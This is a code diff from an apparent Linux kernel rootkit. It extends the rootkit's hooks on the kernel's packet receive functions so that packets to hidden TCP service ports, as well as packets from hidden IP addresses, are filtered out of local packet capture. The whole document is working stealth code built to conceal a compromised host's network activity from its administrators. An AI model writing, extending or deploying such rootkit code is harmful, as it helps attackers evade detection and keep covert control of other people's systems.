@@ -19,8 +19,10 @@ int (*tpacket_rcv)(struct sk_buff*, struct net_device*, struct packet_type*, str
 /* spinlocks for each function we hook */
 spinlock_t packet_rcv_lock;
 unsigned long packet_rcv_flags;
+
 spinlock_t tpacket_rcv_lock;
 unsigned long tpacket_rcv_flags;
+
 spinlock_t packet_rcv_spkt_lock;
 unsigned long packet_rcv_spkt_flags;
 
@@ -34,22 +36,63 @@ char original_tpacket_rcv[6];
 char original_packet_rcv_spkt[6];
 
 /*
- * check if we need to hide this particular packet
+ * checks if this specific tcp service is hidden.
+ */
+int
+is_port_hidden (struct sk_buff *skb)
+{
+	struct iphdr *ip_header;
+	struct tcphdr *tcp_header;
+
+	/* check if this frame contains an IP packet */
+	if (skb->protocol == htons(ETH_P_IP)) {
+		ip_header = (struct iphdr *) skb_network_header(skb);
+		
+		/* check if this is an TCP packet */
+		if (ip_header->protocol == 6) {
+			tcp_header = (struct tcphdr *) skb_transport_header(skb);
+			
+			/* check with the control API if this service is hidden */
+			// TODO: find a way to also filter outgoing packets
+			if (is_service_hidden(ntohs(tcp_header->dest))) {
+				
+				ROOTKIT_DEBUG("Filtered TCP packet detected. Src: %u Dest: %u\n", ntohs(tcp_header->source), ntohs(tcp_header->dest));
+			
+				return 1;
+			}
+			
+			ROOTKIT_DEBUG("Unfiltered TCP packet detected. Src: %u Dest: %u\n", ntohs(tcp_header->source), ntohs(tcp_header->dest));
+		}
+		
+	}
+
+	return 0;
+}
+
+/*
+ * check if we need to hide this particular packet.
  */
 int
 is_packet_hidden (struct sk_buff *skb)
 {
+	struct iphdr *ip_header;
+	
+	/* check if this frame contains an IP packet */
 	if (skb->protocol == htons(ETH_P_IP)) {
-		struct iphdr* iphdr = (struct iphdr*) skb_network_header(skb);
+		ip_header = (struct iphdr *) skb_network_header(skb);
 
-		if (is_ip_hidden(iphdr->saddr)
-				|| is_ip_hidden(iphdr->daddr)) {
+		/* check if we have to filter this IP address */
+		if (is_ip_hidden(ip_header->saddr)
+				|| is_ip_hidden(ip_header->daddr)) {
+				
+			ROOTKIT_DEBUG("Filtered IP address.\n");
 			
 			return 1;
 		}
 	}
 	
-	return 0;
+	/* check if this is a filtered service */
+	return is_port_hidden(skb);
 }
 
 /* hooks 'packet_rcv' */
